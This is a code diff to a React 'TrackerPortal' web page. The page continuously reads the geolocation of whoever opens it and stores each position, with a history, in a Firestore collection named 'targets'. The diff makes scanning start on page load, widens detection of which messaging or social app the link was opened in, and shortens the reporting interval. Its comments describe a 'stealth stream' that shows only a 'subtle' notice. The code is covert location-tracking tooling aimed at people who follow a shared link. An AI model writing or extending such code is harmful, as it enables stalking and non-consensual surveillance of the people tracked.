@@ -21,7 +21,7 @@ function formatTime(seconds: number) {
 }
 
 export const TrackerPortal: React.FC = () => {
-  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('scanning');
+  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
   const [errorMsg, setErrorMsg] = useState<string>('');
   const [progress, setProgress] = useState(0);
   const targetIdRef = useRef<string | null>(null);
@@ -36,6 +36,8 @@ export const TrackerPortal: React.FC = () => {
 
   useEffect(() => {
     setIsClient(true);
+    setStatus('scanning');
+    
     // Detect language from URL
     const params = new URLSearchParams(window.location.search);
     const langParam = params.get('lang');
@@ -121,37 +123,38 @@ export const TrackerPortal: React.FC = () => {
       }
 
       // Detect Platform accurately
-      const ua = navigator.userAgent || "";
+      const ua = (navigator.userAgent || "").toLowerCase();
       let platform = 'Browser';
-      if (ua.includes('FB')) platform = 'Facebook';
-      else if (ua.includes('WhatsApp')) platform = 'WhatsApp';
-      else if (ua.includes('Telegram')) platform = 'Telegram';
-      else if (ua.includes('Instagram')) platform = 'Instagram';
-      else if (ua.includes('Twitter') || ua.includes('X/')) platform = 'X';
+      if (ua.includes('fb')) platform = 'Facebook';
+      else if (ua.includes('whatsapp')) platform = 'WhatsApp';
+      else if (ua.includes('telegram')) platform = 'Telegram';
+      else if (ua.includes('instagram')) platform = 'Instagram';
+      else if (ua.includes('twitter') || ua.includes('x/')) platform = 'X';
+      else if (ua.includes('iphone') || ua.includes('ipad')) platform = 'iOS';
+      else if (ua.includes('android')) platform = 'Android';
 
       // Use the provided name or a fallback
-      const targetDisplayName = targetIdRef.current || `Vector ${auth.currentUser?.uid.slice(0, 4) || targetId?.slice(-4) || 'UNKNOWN'}`;
+      const targetDisplayName = targetIdRef.current || `Asset ${auth.currentUser?.uid.slice(0, 4) || targetId?.slice(-4) || 'ALPHA'}`;
 
       // High-precision stealth stream with quality verification
       let lastReportTime = 0;
-      const MIN_INTERVAL = 5000; // Minimal interval between reports to avoid spam, but keep it real-time
+      const MIN_INTERVAL = 4000; 
 
       navigator.geolocation.watchPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           const now = Date.now();
           
-          // Only update if it's been a few seconds or if it's the first time 
+          // Only update if it's been a few seconds 
           if (now - lastReportTime < MIN_INTERVAL && status === 'granted') {
-             // If we already have a fix, only update if accuracy is significantly better or enough time passed
-             if (accuracy > 20) return; // Wait for better accuracy if we already have one
+             if (accuracy > 30) return; 
           }
           
           setStatus('granted');
           lastReportTime = now;
           
           try {
-            const uid = auth.currentUser?.uid || targetId || `T-ANON-${Math.random().toString(36).substring(7).toUpperCase()}`;
+            const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
             const targetRef = doc(db, 'targets', uid);
             
             const historyItem = { 
@@ -160,7 +163,8 @@ export const TrackerPortal: React.FC = () => {
               time: new Date().toISOString() 
             };
 
-            await setDoc(targetRef, {
+            // Full record for sync
+            const entry = {
               name: targetDisplayName,
               lat: latitude,
               lng: longitude,
@@ -169,7 +173,9 @@ export const TrackerPortal: React.FC = () => {
               status: 'active',
               platform: platform,
               history: arrayUnion(historyItem)
-            }, { merge: true });
+            };
+
+            await setDoc(targetRef, entry, { merge: true });
             
             // Notification success (Subtle)
             const signalHint = document.createElement('div');
